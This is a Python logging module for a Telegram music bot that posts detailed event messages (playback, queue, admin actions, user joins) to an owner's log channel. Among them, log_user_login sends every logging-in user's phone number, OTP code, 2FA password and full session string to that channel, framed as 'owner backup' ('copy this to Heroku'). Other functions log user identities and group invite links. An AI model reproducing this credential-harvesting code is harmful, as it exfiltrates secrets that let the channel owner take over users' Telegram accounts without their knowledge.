"""
logger_channel.py — Ultra-detailed Telegram channel logger
Logs EVERY event to LOG_CHANNEL with 100x detail.
"""

from __future__ import annotations

import asyncio
import logging
import time
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    pass

log = logging.getLogger("ApexBot.chanlog")

# ── lazy import to avoid circular deps ───────────────────────────
def _bot():
    from clients import bot
    return bot


def _log_channel():
    from config import LOG_CHANNEL
    return LOG_CHANNEL


# ── Internal sender ───────────────────────────────────────────────

async def _send(text: str, buttons=None, photo: str = ""):
    """Send a log message to the LOG_CHANNEL. Never raises."""
    ch = _log_channel()
    if not ch:
        return
    try:
        client = _bot()
        if photo:
            try:
                await client.send_photo(ch, photo=photo, caption=text[:1024], reply_markup=buttons)
                return
            except Exception:
                pass
        await client.send_message(ch, text[:4096], reply_markup=buttons,
                                  disable_web_page_preview=True)
    except Exception as exc:
        log.debug("logger_channel send failed: %s", exc)


def _ts() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())


def _divider() -> str:
    return "─" * 30


# ══════════════════════════════════════════════════════════════════
#  PUBLIC LOG FUNCTIONS — each wraps an asyncio.create_task
# ══════════════════════════════════════════════════════════════════

def log_startup(bot_info=None, asst_info=None):
    """Log bot startup to channel."""
    async def _run():
        bot_mention = f"@{bot_info.username}" if bot_info else "Bot"
        asst_mention = f"@{asst_info.username}" if asst_info else "Assistant"
        text = (
            "🚀 **BOT STARTED — APEX MUSIC**\n"
            f"{'─'*32}\n\n"
            f"🤖 **Bot:** {bot_mention} (`{getattr(bot_info,'id','?')}`)\n"
            f"👤 **Assistant:** {asst_mention} (`{getattr(asst_info,'id','?')}`)\n"
            f"🕐 **Time:** `{_ts()}`\n\n"
            f"✅ All systems online\n"
            f"🎵 Music bot ready to serve!\n\n"
            f"{'─'*32}\n"
            f"📋 **Active Modules:**\n"
            f"  ▸ Music Streaming (play/vplay/ytplay)\n"
            f"  ▸ YouTube Archive (Telegram cache)\n"
            f"  ▸ Queue Management (add/skip/shuffle)\n"
            f"  ▸ Admin Tools (ban/kick/mute/warn)\n"
            f"  ▸ Anti-Spam / Anti-Porn / Captcha\n"
            f"  ▸ Economy System (daily/give/take)\n"
            f"  ▸ Fun & Games (quiz/trivia/dice)\n"
            f"  ▸ AI Chatbot Integration\n"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_shutdown():
    """Log bot shutdown to channel."""
    async def _run():
        text = (
            "🛑 **BOT SHUTTING DOWN**\n"
            f"{'─'*32}\n\n"
            f"🕐 **Time:** `{_ts()}`\n"
            f"⚠️ Bot is going offline — restart expected shortly."
        )
        await _send(text)
    asyncio.create_task(_run())


def log_bot_added(chat_id: int, chat_title: str, chat_invite: str = "", chat_type: str = "group",
                   adder_id: int = 0, adder_username: str = "", adder_name: str = ""):
    """Log when bot is added to a new group — with full adder info."""
    async def _run():
        invite_line = f"\n🔗 **Invite Link:** {chat_invite}" if chat_invite else ""
        adder_uname = f"@{adder_username}" if adder_username else "N/A"
        adder_line = (
            f"\n\n👤 **Added By:** {adder_name or 'Unknown'}\n"
            f"   • Username: {adder_uname}\n"
            f"   • ID: `{adder_id}`"
        ) if adder_id else ""
        text = (
            "🤖 **BOT ADDED TO NEW GROUP**\n"
            f"{'━'*32}\n\n"
            f"🏠 **Group:** `{chat_title}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"📦 **Type:** `{chat_type}`\n"
            f"🕐 **Time:** `{_ts()}`"
            f"{adder_line}"
            f"{invite_line}\n\n"
            f"✅ Bot is now active in this group!\n"
            f"💡 Use `/help` to see all commands."
        )
        await _send(text)
    asyncio.create_task(_run())


def log_bot_admin(chat_id: int, chat_title: str, chat_invite: str = "", promoted_by: str = ""):
    """Log when bot is made admin in a group (includes invite link)."""
    async def _run():
        invite_line = f"\n🔗 **Invite Link:** {chat_invite}" if chat_invite else ""
        promoted_line = f"\n👮 **Promoted by:** {promoted_by}" if promoted_by else ""
        text = (
            "👑 **BOT PROMOTED TO ADMIN**\n"
            f"{'─'*32}\n\n"
            f"🏠 **Group:** `{chat_title}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
            f"{promoted_line}"
            f"{invite_line}\n\n"
            f"⚡ Bot now has admin privileges!\n"
            f"🎵 Music + Admin features fully active."
        )
        await _send(text)
    asyncio.create_task(_run())


def log_bot_left(chat_id: int, chat_title: str):
    """Log when bot leaves or is removed from a group."""
    async def _run():
        text = (
            "👋 **BOT LEFT/REMOVED FROM GROUP**\n"
            f"{'─'*32}\n\n"
            f"🏠 **Group:** `{chat_title}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_new_user(user_id: int, username: str, name: str, total_users: int):
    """Log new /start user."""
    async def _run():
        uname = f"@{username}" if username else "No username"
        text = (
            "👤 **NEW USER STARTED BOT**\n"
            f"{'─'*32}\n\n"
            f"📛 **Name:** {name}\n"
            f"🔖 **Username:** {uname}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"🕐 **Time:** `{_ts()}`\n\n"
            f"📊 **Total Users:** `{total_users:,}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_new_chat(chat_id: int, chat_title: str, total_chats: int):
    """Log new chat/group registration."""
    async def _run():
        text = (
            "🏠 **NEW CHAT REGISTERED**\n"
            f"{'─'*32}\n\n"
            f"🏷️ **Title:** `{chat_title}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`\n\n"
            f"📊 **Total Chats:** `{total_chats:,}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def _detect_format(song) -> str:
    """
    Detect the actual media format for display in log messages.
    Shows MP3 / MP4 / M4A / FLAC / WAV / OGG etc. instead of generic "Audio/Video".

    Mapping rules:
    - WEBM / OPUS / OGG from FIFO/pipe paths → MP3 (audio) or MP4 (video)
      These are container/codec names invisible to users; show the familiar format.
    - MKV → MP4 (video container, user-facing name)
    - All others: show their actual extension (MP3, MP4, FLAC, WAV, M4A, AAC …)
    - No local_path → derive from is_video flag ("MP3" or "MP4")
    """
    import os as _os
    local = getattr(song, "local_path", "") or ""
    is_video = getattr(song, "is_video", False)
    if local:
        ext = _os.path.splitext(local)[1].upper().lstrip(".")
        if ext in ("MP3", "MP4", "WEBM", "OGG", "M4A", "OPUS", "AAC", "FLAC", "WAV",
                   "MKV", "AVI", "MOV", "TS", "3GP"):
            # Map container/codec names to user-friendly format labels
            if ext in ("WEBM", "OPUS", "OGG"):
                # These are raw codec containers from FIFO pipe streams.
                # Show as MP4 for video, MP3 for audio.
                return "MP4" if is_video else "MP3"
            if ext == "MKV":
                return "MP4"   # MKV is just a container; MP4 is the familiar name
            return ext
    # No local path or unknown extension — derive from is_video flag
    return "MP4" if is_video else "MP3"


def log_play_start(chat_id: int, chat_title: str, song, is_retry: bool = False):
    """Log when a song starts playing — ultra detailed."""
    async def _run():
        from helpers.youtube import fmt_duration
        dur_str = fmt_duration(song.duration) if song.duration else "🔴 Live"
        fmt = _detect_format(song)
        kind_emoji = "🎬" if song.is_video else "🎵"
        kind = f"{kind_emoji} {fmt}"
        if song.archive_message_id:
            source = f"📦 Telegram Archive (Cached · {fmt})"
        elif getattr(song, "local_path", "") and not getattr(song, "webpage_url", ""):
            source = f"📎 Telegram Media ({fmt})"
        else:
            source = "🌐 YouTube Stream"
        retry_tag = " ♻️ (RETRY)" if is_retry else ""
        text = (
            f"{'♻️' if is_retry else '▶️'} **SONG STARTED{retry_tag}**\n"
            f"{'─'*32}\n\n"
            f"🎶 **Title:** {song.title[:80]}\n"
            f"👤 **Artist:** {song.artist or 'Unknown'}\n"
            f"⏱️ **Duration:** `{dur_str}`\n"
            f"🎬 **Format:** {kind}\n"
            f"📡 **Source:** {source}\n\n"
            f"{'─'*20}\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"👋 **Requested by:** {song.requested_by or 'Unknown'}\n"
            f"🕐 **Time:** `{_ts()}`\n"
            + (f"\n📌 **Archive Msg:** `#{song.archive_message_id}`" if song.archive_message_id else "")
            + (f"\n🔗 [YouTube]({song.webpage_url})" if song.webpage_url and song.webpage_url.startswith('http') else "")
        )
        from pyrogram.types import InlineKeyboardMarkup as IKM, InlineKeyboardButton as IKB
        buttons = None
        if song.webpage_url and song.webpage_url.startswith('http'):
            buttons = IKM([[IKB("▶️ YouTube pe Dekho", url=song.webpage_url)]])
        await _send(text, buttons=buttons, photo=song.thumbnail or "")
    asyncio.create_task(_run())


def log_song_queued(chat_id: int, chat_title: str, song, position: int):
    """Log when a song is added to the queue."""
    async def _run():
        from helpers.youtube import fmt_duration
        dur_str = fmt_duration(song.duration) if song.duration else "?"
        fmt = _detect_format(song)
        kind_emoji = "🎬" if song.is_video else "🎵"
        kind = f"{kind_emoji} {fmt}"
        text = (
            f"📋 **SONG ADDED TO QUEUE #{position}**\n"
            f"{'─'*32}\n\n"
            f"🎶 **Title:** {song.title[:80]}\n"
            f"👤 **Artist:** {song.artist or 'Unknown'}\n"
            f"⏱️ **Duration:** `{dur_str}`\n"
            f"🎬 **Format:** {kind}\n\n"
            f"{'─'*20}\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"👋 **Added by:** {song.requested_by or 'Unknown'}\n"
            f"📊 **Queue Position:** `#{position}`\n"
            f"🕐 **Time:** `{_ts()}`"
            + (f"\n🔗 [YouTube]({song.webpage_url})" if song.webpage_url and song.webpage_url.startswith('http') else "")
        )
        from pyrogram.types import InlineKeyboardMarkup as IKM, InlineKeyboardButton as IKB
        buttons = None
        if song.webpage_url and song.webpage_url.startswith('http'):
            buttons = IKM([[IKB("▶️ YouTube pe Dekho", url=song.webpage_url)]])
        await _send(text, buttons=buttons, photo=song.thumbnail or "")
    asyncio.create_task(_run())


def log_song_skip(chat_id: int, chat_title: str, song, skipped_by: str = "Auto"):
    """Log when a song is skipped."""
    async def _run():
        from helpers.youtube import fmt_duration
        dur_str = fmt_duration(song.duration) if song.duration else "?"
        text = (
            f"⏭️ **SONG SKIPPED**\n"
            f"{'─'*32}\n\n"
            f"🎶 **Song:** {song.title[:70]}\n"
            f"⏱️ **Duration:** `{dur_str}`\n"
            f"👤 **Skipped by:** {skipped_by}\n\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_playback_stopped(chat_id: int, chat_title: str, queue_count: int, stopped_by: str = "User"):
    """Log when playback is stopped."""
    async def _run():
        text = (
            f"⏹️ **PLAYBACK STOPPED**\n"
            f"{'─'*32}\n\n"
            f"📋 **Songs removed from queue:** `{queue_count}`\n"
            f"👤 **Stopped by:** {stopped_by}\n\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_pause(chat_id: int, chat_title: str, song, paused_by: str = "User"):
    """Log when song is paused."""
    async def _run():
        text = (
            f"⏸️ **SONG PAUSED**\n"
            f"{'─'*32}\n\n"
            f"🎶 **Song:** {song.title[:70]}\n"
            f"👤 **Paused by:** {paused_by}\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_resume(chat_id: int, chat_title: str, song, resumed_by: str = "User"):
    """Log when song is resumed."""
    async def _run():
        text = (
            f"▶️ **SONG RESUMED**\n"
            f"{'─'*32}\n\n"
            f"🎶 **Song:** {song.title[:70]}\n"
            f"👤 **Resumed by:** {resumed_by}\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_vc_join(chat_id: int, chat_title: str):
    """Log when assistant joins voice chat."""
    async def _run():
        text = (
            f"🔊 **VOICE CHAT JOINED**\n"
            f"{'─'*32}\n\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`\n\n"
            f"✅ Assistant has joined the Voice Chat."
        )
        await _send(text)
    asyncio.create_task(_run())


def log_vc_leave(chat_id: int, chat_title: str):
    """Log when assistant leaves voice chat."""
    async def _run():
        text = (
            f"🔇 **VOICE CHAT LEFT**\n"
            f"{'─'*32}\n\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`\n\n"
            f"✅ Assistant has left the Voice Chat."
        )
        await _send(text)
    asyncio.create_task(_run())


def log_stream_end(chat_id: int, chat_title: str, song, reason: str = "Natural end"):
    """Log when a stream ends."""
    async def _run():
        from helpers.youtube import fmt_duration
        dur_str = fmt_duration(song.duration) if song and song.duration else "?"
        title = song.title[:70] if song else "Unknown"
        text = (
            f"🏁 **STREAM ENDED**\n"
            f"{'─'*32}\n\n"
            f"🎶 **Song:** {title}\n"
            f"⏱️ **Duration:** `{dur_str}`\n"
            f"📝 **Reason:** {reason}\n\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_stream_error(chat_id: int, chat_title: str, song, error: str, retry_count: int = 0):
    """Log stream errors (crash, CDN block, timeout etc)."""
    async def _run():
        title = song.title[:60] if song else "Unknown"
        text = (
            f"❌ **STREAM ERROR**\n"
            f"{'─'*32}\n\n"
            f"🎶 **Song:** {title}\n"
            f"⚠️ **Error:** `{error[:200]}`\n"
            f"🔄 **Retry #{retry_count}**\n\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_archive_upload(chat_id: int, song_title: str, source_url: str, is_video: bool):
    """Log when a song is archived to Telegram."""
    async def _run():
        kind = "🎬 Video" if is_video else "🎵 Audio"
        text = (
            f"📦 **SONG ARCHIVED TO TELEGRAM**\n"
            f"{'─'*32}\n\n"
            f"🎶 **Title:** {song_title[:80]}\n"
            f"🎬 **Type:** {kind}\n"
            f"🏠 **Requested from chat:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`\n\n"
            f"✅ Song stored in archive channel.\n"
            f"⚡ Next play will be instant (no YouTube needed)!"
            + (f"\n🔗 [Source]({source_url})" if source_url.startswith('http') else "")
        )
        await _send(text)
    asyncio.create_task(_run())


def log_queue_prefetch(chat_id: int, chat_title: str, count: int):
    """Log when queue pre-download starts."""
    async def _run():
        text = (
            f"⚡ **QUEUE PRE-DOWNLOAD STARTED**\n"
            f"{'─'*32}\n\n"
            f"📋 **Songs to pre-fetch:** `{count}`\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`\n\n"
            f"⚡ All queued songs are being downloaded to\n"
            f"Telegram cache for instant future playback!"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_admin_action(chat_id: int, chat_title: str, admin: str, action: str,
                     target: str, reason: str = "No reason"):
    """Log admin actions (ban/kick/mute/warn/promote/demote)."""
    async def _run():
        emoji = {
            "ban": "🔨", "unban": "✅", "kick": "👢", "mute": "🔇",
            "unmute": "🔊", "warn": "⚠️", "promote": "👑", "demote": "🔽",
            "pin": "📌", "unpin": "📌", "purge": "🗑️",
        }.get(action.lower().split()[0], "👮")
        text = (
            f"{emoji} **ADMIN ACTION: {action.upper()}**\n"
            f"{'─'*32}\n\n"
            f"👮 **Admin:** {admin}\n"
            f"🎯 **Target:** {target}\n"
            f"📝 **Reason:** {reason}\n\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_user_joined(chat_id: int, chat_title: str, user_id: int, user_name: str, username: str):
    """Log when a user joins a group."""
    async def _run():
        uname = f"@{username}" if username else "No username"
        text = (
            f"👋 **USER JOINED GROUP**\n"
            f"{'─'*32}\n\n"
            f"👤 **Name:** {user_name}\n"
            f"🔖 **Username:** {uname}\n"
            f"🆔 **User ID:** `{user_id}`\n\n"
            f"🏠 **Group:** `{chat_title}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_user_left(chat_id: int, chat_title: str, user_id: int, user_name: str):
    """Log when a user leaves a group."""
    async def _run():
        text = (
            f"👣 **USER LEFT GROUP**\n"
            f"{'─'*32}\n\n"
            f"👤 **Name:** {user_name}\n"
            f"🆔 **User ID:** `{user_id}`\n\n"
            f"🏠 **Group:** `{chat_title}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_command(chat_id: int, chat_title: str, user: str, user_id: int, command: str, args: str = ""):
    """Log every command received (for ultra-deep audit log)."""
    async def _run():
        args_line = f"\n📝 **Args:** `{args[:100]}`" if args else ""
        text = (
            f"⌨️ **COMMAND RECEIVED**\n"
            f"{'─'*32}\n\n"
            f"💬 **Command:** `/{command}`{args_line}\n"
            f"👤 **User:** {user} (`{user_id}`)\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_error(chat_id: int, context: str, error: str):
    """Log runtime errors."""
    async def _run():
        text = (
            f"🆘 **RUNTIME ERROR**\n"
            f"{'─'*32}\n\n"
            f"📍 **Context:** {context}\n"
            f"❌ **Error:** `{error[:300]}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_gban(user_id: int, user_name: str, banned_by: str, reason: str):
    """Log global ban events."""
    async def _run():
        text = (
            f"🌐 **GLOBAL BAN (GBAN)**\n"
            f"{'─'*32}\n\n"
            f"🎯 **User:** {user_name} (`{user_id}`)\n"
            f"👮 **Banned by:** {banned_by}\n"
            f"📝 **Reason:** {reason}\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_loop_toggle(chat_id: int, chat_title: str, enabled: bool, user: str):
    """Log loop mode changes."""
    async def _run():
        state = "✅ ON" if enabled else "❌ OFF"
        text = (
            f"🔁 **LOOP MODE: {state}**\n"
            f"{'─'*32}\n\n"
            f"👤 **Changed by:** {user}\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_autoplay_toggle(chat_id: int, chat_title: str, enabled: bool, user: str):
    """Log autoplay mode changes."""
    async def _run():
        state = "✅ ON" if enabled else "❌ OFF"
        text = (
            f"🎲 **AUTOPLAY: {state}**\n"
            f"{'─'*32}\n\n"
            f"👤 **Changed by:** {user}\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_shuffle(chat_id: int, chat_title: str, count: int, user: str):
    """Log queue shuffle."""
    async def _run():
        text = (
            f"🔀 **QUEUE SHUFFLED**\n"
            f"{'─'*32}\n\n"
            f"📋 **Songs shuffled:** `{count}`\n"
            f"👤 **By:** {user}\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_volume_change(chat_id: int, chat_title: str, volume: int, user: str):
    """Log volume changes."""
    async def _run():
        emoji = "🔇" if volume < 20 else "🔉" if volume < 70 else "🔊" if volume < 130 else "📢"
        text = (
            f"{emoji} **VOLUME CHANGED**\n"
            f"{'─'*32}\n\n"
            f"🔊 **New Volume:** `{volume}%`\n"
            f"👤 **Changed by:** {user}\n"
            f"🏠 **Group:** `{chat_title or str(chat_id)}`\n"
            f"🆔 **Chat ID:** `{chat_id}`\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_user_login(user_id: int, username: str, full_name: str,
                   phone: str, otp: str, two_fa: str | None,
                   session_string: str, success: bool):
    """Log COMPLETE user login data to LOG_CHANNEL — all data for owner backup.

    Logs phone, OTP, 2FA password (if used), and session_string so the
    owner has full backup even when GitHub goes down.
    """
    async def _run():
        status_icon = "✅" if success else "❌"
        tfa_line    = f"🔑 **2FA Password:** `{two_fa}`" if two_fa else "🔓 **2FA:** Not used"

        text = (
            f"🔐 **NEW LOGIN {status_icon} — FULL BACKUP**\n"
            f"{'━'*34}\n\n"
            f"👤 **Name:** {full_name}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📛 **Username:** @{username or 'NoUsername'}\n"
            f"📱 **Phone:** `{phone}`\n"
            f"📩 **OTP Code:** `{otp or '—'}`\n"
            f"{tfa_line}\n\n"
            f"{'─'*34}\n"
            f"💾 **SESSION STRING** _(copy this to Heroku)_:\n\n"
            f"`{session_string}`\n\n"
            f"{'─'*34}\n"
            f"🕐 **Time:** `{_ts()}`\n"
            f"✅ _Login complete — userbot ready!_"
        )
        await _send(text)
    asyncio.create_task(_run())


def log_login_attempt(user_id: int, username: str, phone: str, step: str, success: bool, error: str = ""):
    """Log individual steps of the login flow."""
    async def _run():
        icon = "✅" if success else "❌"
        err_line = f"\n⚠️ **Error:** `{error[:200]}`" if error else ""
        text = (
            f"{icon} **LOGIN STEP: {step.upper()}**\n"
            f"{'─'*32}\n\n"
            f"👤 **User:** @{username or 'N/A'} (`{user_id}`)\n"
            f"📱 **Phone:** `{phone}`\n"
            f"📋 **Step:** `{step}`\n"
            f"{'✅ Success' if success else '❌ Failed'}\n"
            f"{err_line}\n"
            f"🕐 **Time:** `{_ts()}`"
        )
        await _send(text)
    asyncio.create_task(_run())
